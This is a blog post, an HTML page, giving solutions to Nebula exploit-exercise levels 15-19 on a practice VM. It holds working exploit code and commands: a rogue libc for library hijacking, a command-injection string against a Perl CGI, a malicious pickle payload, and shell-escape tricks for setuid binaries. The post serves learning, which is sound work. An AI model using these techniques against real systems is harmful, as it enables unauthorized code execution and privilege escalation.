@@ -1,0 +1,470 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Nebula Shell Exploits (Solutions 15-19) - Louis Li</title>
+	<meta name="author" content="Louis Li">
+
+	
+	<meta name="description" content="
+
+
+
+
+
+	Nebula Shell Exploits (Solutions 15-19)
+        Shell-based exploit exercises 
+	Overview
+This is third and final post of my solutions for Ex...">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta property="fb:admins" content="100001696373537" />
+
+	<link href="http://feeds.feedburner.com/louisligithub" rel="alternate" title="Louis Li" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://louisrli.github.io/blog/2012/08/17/nebula2/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+        <script type="text/javascript"
+            src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+          </script>
+	<link href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,400,700' rel='stylesheet' type='text/css'>
+	<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="https://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-5225926150102880",
+          enable_page_level_ads: true
+     });
+</script>
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	<script type="text/javascript">
+		$(function(){
+                    $('.profilepic').append("<img src='https://www.gravatar.com/avatar/" + "9f050cf96c6cc933141f0242e5b723fd" + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+</div>
+<hgroup>
+  <h1><a href="/">Louis Li</a></h1>
+  
+</hgroup>
+
+<p class="subtitle"></p>
+<nav id="main-nav"><ul class="main-navigation">
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="/blog/categories/projects">Sideprojects</a></li>
+  <li><a href="/publications">Publications</a></li>
+  <li><a href="http://github.com/louisrli">Github</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="mailto:pong@outlook.com">Contact</a></li>
+</ul>
+
+
+<section class="aboutme">
+  <p>
+    Harvard student and developer.
+  </p>
+</section>
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+		
+		<a class="github" href="https://github.com/louisrli" title="GitHub">GitHub</a>
+		
+		
+		<a class="rss" href="http://feeds.feedburner.com/louisligithub" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			<div class="mid-col-container">
+				<div id="content" class="inner"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Github top leaderboard -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5225926150102880"
+     data-ad-slot="1340213627"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Nebula Shell Exploits (Solutions 15-19)</h1>
+        <h3 class="subtitle" itemprop="subtitle">Shell-based exploit exercises </h3>
+	<div class="entry-content" itemprop="articleBody"><h1 id="overview">Overview</h1>
+<p>This is third and final post of my solutions for <a href="http://exploit-exercises.com/nebula">Exploit Exercises</a>. This comes about a month after finishing 10-14 – I was distracted by some other projects.</p>
+
+<h2 id="level-15">Level 15</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level15">(full)</a>: <code class="language-plaintext highlighter-rouge">strace</code> on the binary reveals that it searches for libraries based on <a href="http://saintaardvarkthecarpeted.com/blog/archive/2005/08/_etc_ld_so_nohwcap.html">hardware capabilities</a>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>strace /home/flag15/flag15 2&gt;&amp;1 | less
+<span class="c">...
+</span><span class="go">stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfc25f24) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfc25f24) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfc25f24) = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78cd000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
+stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfc25f24) = -1 ENOENT (No such file or directory)
+</span><span class="c">...</span></code></pre></figure>
+
+<p>We want to either substitute our own version of libc, overriding the <code class="language-plaintext highlighter-rouge">puts()</code> call in <code class="language-plaintext highlighter-rouge">flag15</code>, or we want to execute code in the process. While the hard part isn’t creating our own shared library, we have to figure out how to prevent <code class="language-plaintext highlighter-rouge">libc</code> from being linked into our library. This solution executes code in the makeshift <code class="language-plaintext highlighter-rouge">libc.so</code>.</p>
+
+<!-- more -->
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<span class="c"># /home/level15/flag.sh</span>
+getflag <span class="o">&gt;</span> /home/flag15/getflag.log</code></pre></figure>
+
+<p><br />
+<code class="language-plaintext highlighter-rouge">~/version</code>: preventing an error about requiring <code class="language-plaintext highlighter-rouge">GLIBC_2.0</code>:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">GLIBC_2.0 { };</code></pre></figure>
+
+<p><br />
+<code class="language-plaintext highlighter-rouge">~/run.sh</code>: A makeshift Makefile that also executes our code.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash -ex</span>
+<span class="c"># run.sh</span>
+gcc <span class="nt">-fPIC</span> <span class="nt">-g</span> <span class="nt">-c</span> <span class="nt">-Wall</span> getflag.c
+gcc <span class="nt">-shared</span> <span class="nt">-Wl</span>,-Bstatic,-soname,libc.so.6,--version-script,version <span class="nt">-o</span> libc.so.6 getflag.o  <span class="nt">-L</span>/usr/lib/i386-linux-gnu <span class="nt">-static-libgcc</span>
+<span class="nb">mv</span> /home/level15/libc.so.6 /var/tmp/flag15/
+/home/flag15/flag15
+<span class="nb">cat</span> /home/flag15/getflag.log</code></pre></figure>
+
+<p><br />
+<code class="language-plaintext highlighter-rouge">~/getflag.c</code>: another interpretation of “libc,” but it happens to call <code class="language-plaintext highlighter-rouge">execv</code>.</p>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="c1">// If this isn't here, we have an error about a missing symbol</span>
+<span class="kt">void</span> <span class="nf">__cxa_finalize</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">d</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html</span>
+<span class="kt">int</span> <span class="nf">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">),</span> <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">))</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">args_new</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"/home/level15/flag.sh"</span> <span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">args_new</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>./run.sh
+<span class="go">You have successfully executed getflag on a target account</span></code></pre></figure>
+
+<h2 id="level-16">Level 16</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level16">(full)</a>: A Perl script running on port 1616 runs <code class="language-plaintext highlighter-rouge">egrep</code> with user input. It has some red herrings about a username and a password, but the goal is to execute arbitrary code.</p>
+
+<p>This solution uses <a href="http://hakipedia.com/index.php/Poison_Null_Byte">null byte injection</a> to execute arbitrary commands on the target account.</p>
+
+<p>There are two parts to the solution:</p>
+
+<ol>
+  <li>The Perl script converts all input to uppercase. We work around this by using a wildcard match, searching for <code class="language-plaintext highlighter-rouge">/tmp/RUN/</code> (our script) as <code class="language-plaintext highlighter-rouge">/*/RUN</code>.</li>
+  <li>The Perl string doesn’t immediately allow us to execute arbitrary code. We have to terminate the string correctly with the right combination of <code class="language-plaintext highlighter-rouge">"</code>, “<code class="language-plaintext highlighter-rouge">\</code><code class="language-plaintext highlighter-rouge">", and </code>%00`. The last one is the null character in a URL.</li>
+</ol>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<span class="c"># /home/level16/curl</span>
+<span class="nb">echo</span> <span class="nv">$1</span>  <span class="c"># sanity check</span>
+<span class="nv">url</span><span class="o">=</span><span class="s2">"http://localhost:1616/index.cgi?username=</span><span class="nv">$1</span><span class="s2">&amp;password=foo"</span>
+<span class="nb">echo</span> <span class="nv">$uri</span>
+curl <span class="nt">--globoff</span> <span class="nv">$3</span> <span class="s2">"</span><span class="nv">$uri</span><span class="s2">"</span>
+<span class="nb">ls</span> /home/flag16 | <span class="nb">grep </span>getflag.log</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
+<span class="c"># /tmp/RUN</span>
+getflag <span class="o">&gt;</span> /home/flag16/getflag.log</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>~/curl <span class="s1">' "`/*/RUN` %00 '</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/flag16/getflag.log
+<span class="go">You have successfully executed getflag on a target account</span></code></pre></figure>
+
+<h2 id="level-17">Level 17</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level17">(full)</a>: A Python script running on port 10007 loads pickled data from input.</p>
+
+<p>The vulnerability of the Python <code class="language-plaintext highlighter-rouge">pickle</code> module is <a href="https://www.google.com/search?q=pickle+vulnerability">well-documented</a>. The Python docs say:</p>
+
+<blockquote>
+  <p>Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source</p>
+</blockquote>
+
+<p><a href="http://nadiana.com/python-pickle-insecure">This article</a> gives us an example of malicious Pickle data.</p>
+
+<p>Our pickled “data” goes in <code class="language-plaintext highlighter-rouge">~/cmd</code>:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">cos
+system
+(S' /tmp/run17'
+tR.</code></pre></figure>
+
+<p>We send the pickled data to the listening script.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /tmp/run17
+<span class="gp">#</span><span class="o">!</span>/bin/bash
+<span class="gp">getflag &gt;</span><span class="w"> </span>/home/flag17/getflag.log
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat </span>cmd | nc localhost 10007
+<span class="go">Accepted connection from 127.0.0.1:56228^C
+</span><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/flag17/getflag.log
+<span class="go">You have successfully executed getflag on a target account</span></code></pre></figure>
+
+<h3 id="interpreting-pickled-data">Interpreting Pickled data</h3>
+<p>I was curious about the parts of the malicious pickle. I searched first for the <code class="language-plaintext highlighter-rouge">pickle</code> format specification, but I wasn’t able to find it. I was a bit surprised that I was only able to find <a href="http://peadrop.com/blog/2007/06/18/pickle-an-interesting-stack-language/">one article</a> related to the semantics of the pickle format. Part of our input is explained:</p>
+
+<blockquote>
+  <p>The ‘(‘ is simply a marker. It is a object in the stack that tells the tuple builder, ‘t’, when to stop. The tuple builder pops items from the stack until it reaches a marker. Then, it creates a tuple with these items and pushes this tuple back on the stack. You can use multiple markers to construct a nested tuple…</p>
+</blockquote>
+
+<h2 id="level-18">Level 18</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level18">(full)</a>: <code class="language-plaintext highlighter-rouge">flag18</code> is a program that mimics a login shell with various options such as <code class="language-plaintext highlighter-rouge">login</code>, <code class="language-plaintext highlighter-rouge">logout</code>, <code class="language-plaintext highlighter-rouge">shell</code> (see full description). The flag directory contains an unreadable password file.</p>
+
+<h3 id="discussion">Discussion</h3>
+<p>This problem was more complex than the others, given the number of options provided initially.</p>
+
+<p>There are flags on <code class="language-plaintext highlighter-rouge">flag19</code> for a debug file and a verbose level. Using <code class="language-plaintext highlighter-rouge">-d /dev/tty</code> saves us some effort.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>/home/flag19/flag19 <span class="nt">-d</span> /dev/tty <span class="nt">-vvvvv</span>
+<span class="go">login
+got [login] as input
+attempting to login</span></code></pre></figure>
+
+<p>If we iterate through the possible commands, we can rule out some paths.</p>
+
+<ul>
+  <li>There’s no apparent path for dumping the contents of the password file through the code.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">notsupported()</code> and <code class="language-plaintext highlighter-rouge">setuser()</code> functions seem to deal with strings and buffers. These are potential solutions, but from a metagame perspective, Nebula solutions use shell exploits, not memory exploits.</li>
+</ul>
+
+<p>We can confirm this by trying playing around with buffer overflows and format strings:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">site exec %s%s%s%s%s  # notsupported() -&gt; prints some of the stack
+site exec %n  # notsupported() -&gt; fails with *** %n in writable segment detected ***
+setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  # setuser() -&gt; exits immediately, detecting buffer overflow</code></pre></figure>
+
+<h3 id="solution">Solution</h3>
+
+<p><code class="language-plaintext highlighter-rouge">if(fp)</code> will fail if the file can’t be opened for any reason. Since the files opened by <code class="language-plaintext highlighter-rouge">login</code> are never closed, we can open files until we reach the maximum number of file descriptors. <code class="language-plaintext highlighter-rouge">fp</code> will then be <code class="language-plaintext highlighter-rouge">NULL</code> once the maximum number is reached. Finally, we use <code class="language-plaintext highlighter-rouge">closelog</code> to free a file descriptor.</p>
+
+<p>If <code class="language-plaintext highlighter-rouge">closelog</code> isn’t called, <code class="language-plaintext highlighter-rouge">execve("/bin/sh", ...)</code> will fail with an error loading a shared library <code class="language-plaintext highlighter-rouge">libncurses.so.5</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 2000<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"login foo"</span> <span class="o">&gt;&gt;</span> ~/flood<span class="p">;</span> <span class="k">done</span>
+<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"closelog"</span> <span class="o">&gt;&gt;</span> ~/flood
+<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"shell"</span> <span class="o">&gt;&gt;</span> ~/flood
+<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"getflag &gt; /tmp/getflag.log"</span> <span class="o">&gt;</span> /tmp/getflag <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>a+x /tmp/getflag</code></pre></figure>
+
+<p>The initial attempt looks like this:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/flag18/
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> ~/flood | ./flag18 <span class="nt">-d</span> /dev/tty
+<span class="c">...
+</span><span class="go">/home/flag18/flag18: -d: invalid option</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">sh</code> doesn’t have a <code class="language-plaintext highlighter-rouge">-d</code> flag. The author left a hint to look at the options in the man page; <code class="language-plaintext highlighter-rouge">sh</code> needs an option that ignores the input afterwards.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> ~/flood | ./flag18 <span class="nt">--init-file</span> /tmp/getflag <span class="nt">-d</span> /dev/tty</code></pre></figure>
+
+<p>This actually opens a promptless shell reading from stdin.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="c">...
+</span><span class="go">logged in successfully (without password file)
+logged in successfully (without password file)
+logged in successfully (without password file)
+whoami
+flag18
+cat /home/flag18/password
+44226113-d394-4f46-9406-91888128e27a
+getflag
+You have successfully executed getflag on a target account</span></code></pre></figure>
+
+<p>The password doesn’t seem to work for logging into the <code class="language-plaintext highlighter-rouge">flag18</code> account, but the shell can execute <code class="language-plaintext highlighter-rouge">getflag</code>.</p>
+
+<h2 id="level-19">Level 19</h2>
+<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level19">(full)</a>: The <code class="language-plaintext highlighter-rouge">flag19</code> executable checks if the root user started the process. If so, then it runs <code class="language-plaintext highlighter-rouge">execve</code> on <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+
+<p><a href="http://cs61.seas.harvard.edu/cs61wiki/images/7/7b/Lec21-Processes.pdf">CS61 Lecture Notes (Processes)</a> was particularly valuable here. I won’t end up taking the class, but I should show my appreciation for the lecture notes – they’re all very well made.</p>
+
+<p>We want to start <code class="language-plaintext highlighter-rouge">flag19</code> in an <a href="http://en.wikipedia.org/wiki/Orphan_process">orphan process</a>. An orphan process is claimed by the program <code class="language-plaintext highlighter-rouge">init</code> (PID 1), which is owned by root (UID 0). The plan looks like:</p>
+
+<ol>
+  <li>Use <code class="language-plaintext highlighter-rouge">fork()</code> to create a child process, exit the parent process, and <code class="language-plaintext highlighter-rouge">sleep()</code> to create an orphan.</li>
+  <li>Execute <code class="language-plaintext highlighter-rouge">/home/flag19/flag19</code> with our arguments The <code class="language-plaintext highlighter-rouge">stat</code> should complete successfully, as we control the time of check.</li>
+</ol>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// attempt.c</span>
+
+<span class="cp">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"executing code in orphan…</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+		<span class="kt">char</span> <span class="o">*</span><span class="n">flag19_args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"-c"</span> <span class="s">"/home/level19/run19.sh"</span> <span class="p">};</span>
+		<span class="n">execv</span><span class="p">(</span><span class="s">"/home/flag19/flag19"</span><span class="p">,</span> <span class="n">flag19_args</span><span class="p">);</span>
+		<span class="k">return</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">else</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"returning from parent</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"sanity check, outside both - should never happen</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash.sh</span>
+<span class="c"># /home/level19/run19.sh</span>
+<span class="c"># Standard getflag wrapper</span>
+<span class="nv">file</span><span class="o">=</span>/home/flag19/getflag19.log
+getflag <span class="o">&gt;</span> <span class="k">${</span><span class="nv">file</span><span class="k">}</span>
+<span class="nb">id</span> <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">file</span><span class="k">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-o</span> attempt.c attempt
+<span class="gp">$</span><span class="w"> </span>./attempt
+<span class="go">returning from parent
+</span><span class="gp">$</span><span class="w"> </span>executing code <span class="k">in </span>orphan...
+<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/flag19/getflag19.log
+<span class="go">You have successfully executed getflag on a target account
+uid=1020(level19) ...</span></code></pre></figure>
+
+<h3 id="tangent">Tangent</h3>
+<p>I ran into an interesting issue caused by laziness (well, in reality, a desire for flexibility).</p>
+
+<p>The code below does <strong>not</strong> run <code class="language-plaintext highlighter-rouge">execve</code> as suid. It runs it as the user <code class="language-plaintext highlighter-rouge">level19</code> instead of <code class="language-plaintext highlighter-rouge">flag19</code>, which may have been caused by passing down <code class="language-plaintext highlighter-rouge">envp</code>.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span> <span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="c1">// our other code…</span>
+		<span class="n">execve</span><span class="p">(</span><span class="s">"/home/flag19/flag19"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This meant that I could conveniently pass arguments through the executable:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gcc attempt.c -o attempt
+./attempt "/home/level19/run19.sh"</code></pre></figure>
+
+<p>Unfortunately, it also meant that <code class="language-plaintext highlighter-rouge">getflag</code> wouldn’t execute on the correct user.</p>
+</div>
+
+</article>
+
+	<div class="share">
+  <!--AddThis Button BEGIN -->
+  <div class="addthis_toolbox addthis_default_style addthis_32x32_style">
+    <a class="addthis_button_preferred_1"></a>
+    <a class="addthis_button_preferred_2"></a>
+    <a class="addthis_button_preferred_3"></a>
+    <a class="addthis_button_preferred_4"></a>
+    <a class="addthis_button_compact"></a>
+    <a class="addthis_counter addthis_bubble_style"></a>
+  </div>
+  <script type="text/javascript">var addthis_config = {"data_track_addressbar":true};</script>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-51e5a5762f46bbe9"></script>
+  <!-- AddThis Button END -->
+</div>
+
+
+
+<script async
+  src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Github bottom leaderboard -->
+<ins class="adsbygoogle"
+       style="display:block"
+            data-ad-client="ca-pub-5225926150102880"
+                 data-ad-slot="1968553857"
+                      data-ad-format="auto"
+                           data-full-width-responsive="true"></ins>
+  <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+</div>
+			</div>
+			<footer id="footer" class="inner"><p>
+  Copyright &copy; 2020 - Louis Li
+</p>
+
+Theme originally by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
+</footer>
+			<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'llgithub';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://louisrli.github.io/blog/2012/08/17/nebula2/';
+        var disqus_url = 'http://louisrli.github.io/blog/2012/08/17/nebula2/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'https://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-32823730-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+
+
+		</div>
+	</div>
+</body>
+</html>
